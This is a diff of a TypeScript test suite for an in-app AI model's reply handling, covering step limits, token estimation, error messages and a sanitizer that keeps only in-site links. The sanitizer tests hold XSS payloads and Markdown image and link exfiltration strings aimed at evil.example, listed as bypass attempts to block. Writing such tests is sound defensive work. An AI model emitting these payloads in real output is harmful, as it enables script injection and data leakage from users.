@@ -51,7 +51,7 @@ describe('一句话怎么答', () => {
     assert.match(toolMsg.content as string, /APPROVED/)
 
     const done = s.events.find(([e]) => e === 'done')![1]
-    assert.equal(done.text, 'PO20261120 已审核，[打开采购单](/purchases/12)。供应商官网 点这里 ')
+    assert.equal(done.text, 'PO20261120 已审核，[打开采购单](/purchases/12)。供应商官网 点这里 图')
     assert.deepEqual(s.events.filter(([e]) => e === 'tool').map(([, d]) => d.status), ['running', 'ok'])
     assert.equal(s.events.find(([e]) => e === 'tool')![1].label, '采购单')
 
@@ -83,10 +83,12 @@ describe('一句话怎么答', () => {
     assert.match(toolMsgs[2]!.content as string, /一次最多调 2 个/)
   })
 
-  test('轮数用完还在查：给一句换个问法的话，不无限查下去', async () => {
+  test('轮数用完还在查：最后一轮不许再调工具；模型不听也不调，给一句换个问法的话', async () => {
     const s = setup([1, 2, 3, 4].map((i) => call('get_purchase_order', { id: i }, `c${i}`)), { '/api/purchase-orders/1': ok({}), '/api/purchase-orders/2': ok({}), '/api/purchase-orders/3': ok({}), '/api/purchase-orders/4': ok({}) })
     await ask(s, '查个遍')
     assert.equal(s.llm.seen.length, LIMITS.maxSteps)
+    assert.deepEqual(s.llm.seen.map((x) => x.options.toolChoice), [undefined, undefined, undefined, 'none'])
+    assert.equal(s.requests.length, LIMITS.maxSteps - 1, '最后一轮要调的没调')
     assert.match(String(s.events.find(([e]) => e === 'done')![1].text), /换个说法/)
   })
 
@@ -96,6 +98,30 @@ describe('一句话怎么答', () => {
     assert.deepEqual(s.events.map(([e]) => e), ['error'])
     assert.match(String(s.events[0]![1].message), /429/)
     assert.equal(s.store.messagesById[1]!.error, '模型服务返回 429：rate limited')
+  })
+
+  test('模型服务没回用量（或回 0）：照字数估，全系统的 token 额度照样会涨', async () => {
+    const s = setup([{ content: '好的', toolCalls: [], usage: null }])
+    await ask(s, '你好')
+    assert.ok(s.store.tokens > 100, `估出来 ${s.store.tokens}`)
+    const z = setup([{ content: '好的', toolCalls: [], usage: { promptTokens: 0, completionTokens: 0 } }])
+    await ask(z, '你好')
+    assert.ok(z.store.tokens > 100, `估出来 ${z.store.tokens}`)
+  })
+
+  test('不是模型的错（程序出错）：给用户错误编号，不给原始异常', async () => {
+    const s = setup([new TypeError('Cannot read properties of undefined (reading x)')])
+    await ask(s, '你好')
+    assert.match(String(s.events[0]![1].message), /^助手出错了，错误编号 r1$/)
+  })
+
+  test('上一句没答出来：历史里连那一问一起不带，不留落单的问题（严格交替的模型会报 400）', async () => {
+    const s = setup([new LlmError('模型太久没回应，稍后再问'), text('有 3 张。'), text('PO1')])
+    const id = await ask(s, '第一问没答出来')
+    await ask(s, '待审核的采购单有几张', id)
+    await ask(s, '最早的是哪张', id)
+    const third = s.llm.seen[2]!.messages.map((m) => [m.role, m.content])
+    assert.deepEqual(third.slice(1), [['user', '待审核的采购单有几张'], ['assistant', '有 3 张。'], ['user', '最早的是哪张']])
   })
 
   test('第二句带上第一句的问答', async () => {
@@ -136,15 +162,46 @@ describe('开始答以前的检查', () => {
 describe('回答里只留站内链接', () => {
   const cases: [string, string][] = [
     ['[采购单](/purchases/12)', '[采购单](/purchases/12)'],
-    ['[列表](/orders?status=DRAFT)', '[列表](/orders?status=DRAFT)'],
+    ['[库存](/stock)', '[库存](/stock)'],
+    ['[列表](/orders?status=DRAFT)', '列表'],
+    ['[编辑](/purchases/12/edit)', '编辑'],
+    ['[导出](/api/orders/export)', '导出'],
     ['[官网](https://evil.example)', '官网'],
     ['[协议相对](//evil.example/x)', '协议相对'],
     ['[脚本](javascript:alert(1))', '脚本'],
-    ['![图](/files/a.png)前', '前'],
-    ['<img src=x onerror=alert(1)>后', '后'],
+    ['![图](/files/a.png)前', '图前'],
+    ['<img src=x onerror=alert(1)>后', '＜img src=x onerror=alert(1)>后'],
     ['看 https://evil.example/a?b=1 这里', '看 （外部链接已去掉） 这里'],
+    ['看 www.evil.example/leak?d=1 这里', '看 （外部链接已去掉） 这里'],
+    ['伪造记号 \u00000\u0000', '伪造记号 0'],
   ]
   for (const [input, expected] of cases) {
     test(input, () => assert.equal(sanitize(input), expected))
+  }
+
+  // 审查（T-3d7b55 #2）给的绕过写法：处理完以后不能再有能被 Markdown / HTML 认成链接、图片、标签的东西
+  const attacks = [
+    '![x][1]\n\n[1]: //evil.example/leak?d=SECRET',
+    '![x][1]\n\n[1]: &#104;ttps://evil.example/leak?d=SECRET',
+    '![evil]\n\n[evil]: //evil.example/leak',
+    '[click][1]\n\n[1]: javascript:alert(1)',
+    '<<x>img src="//evil.example/leak?d=SECRET">',
+    '<<x>script>alert(1)<<x>/script>',
+    "!<x>[a](//evil.example/leak 't')",
+    '![x](//evil.example/leak?a=((1)))',
+    '![a[b]](//evil.example/leak?d=1)',
+    "[click](//evil.example/leak 't')",
+    "[click](javascript:alert(1) 't')",
+    '[click]( //evil.example/leak )',
+    '[click](\n//evil.example/leak)',
+    '<//evil.example/leak>',
+    '[<img src=x onerror=alert(1)>](/orders/1)',
+  ]
+  for (const input of attacks) {
+    test(`绕不过：${JSON.stringify(input).slice(1, 40)}`, () => {
+      const out = sanitize(input)
+      assert.ok(!out.includes('<'), `留下了 <：${out}`)
+      assert.ok(!/[[\]]/.test(out.replace(/\[[^[\]]+\]\(\/(?:orders|purchases)(?:\/\d+)?\)/g, '')), `留下了站内链接以外的方括号：${out}`)
+    })
   }
 })
